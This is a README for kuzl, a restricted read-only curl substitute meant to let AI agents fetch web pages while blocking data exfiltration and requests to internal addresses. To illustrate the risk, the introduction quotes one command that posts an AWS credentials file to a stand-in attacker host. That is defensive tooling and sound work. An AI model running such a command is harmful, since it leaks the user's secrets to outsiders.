# kuzl

A read-only `curl` for AI agents: GET and HEAD only, nothing local is ever
sent, and where requests may go is set by the environment, not by the
command line.

kuzl is to `curl` what [ghzt](https://github.com/evadcmd/ghzt) is to `gh`
and `git`: one binary, symlinked as `curl`, that an agent can be allowed to
run with a plain `Bash(curl:*)` prefix rule. The real curl can't be: once it
is allowed, `curl -d @~/.aws/credentials https://evil.example` reads a file
and sends it out in one call.

The design and roadmap live in
[#1](https://github.com/evadcmd/kuzl/issues/1). Steps 1 and 2 are in: the
skeleton and the network policy (`internal/netguard`). The `curl` command
doesn't fetch anything yet; that is step 3.

## Testing locally

```sh
go build -o bin/kuzl ./cmd/kuzl
bin/kuzl curl --help
```

`bin/` is gitignored. Run as `kuzl`, the binary has `curl` as a subcommand,
so no symlink is needed for testing. Don't put `bin/` on your `PATH` once it
has a `curl` symlink: it would shadow the real one.

### Environment

- `KUZL_ROOT`: the directory `-o` (step 4) writes are confined to. Defaults
  to the working directory.
- `KUZL_DENY_HOSTS` and `KUZL_ALLOW_HOSTS`: comma-separated hosts.
  `example.com` matches that host only, `*.example.com` its subdomains (not
  `example.com` itself). Deny wins, and an empty allow list allows every
  public host. An entry that is neither form is an error, not skipped.
- Whatever the lists say, only http and https URLs without credentials are
  fetched, and only public addresses are dialed: loopback, private,
  link-local (the cloud metadata endpoint included), CGNAT and the other
  special-purpose ranges are refused, on the address actually connected to.
  `HTTP(S)_PROXY` is ignored.
- Telemetry stays off unless an OTLP endpoint is set
  (`OTEL_EXPORTER_OTLP_ENDPOINT` or `OTEL_EXPORTER_OTLP_LOGS_ENDPOINT`).

### Unit tests

```sh
go vet ./...
go test -race ./...
golangci-lint run
```
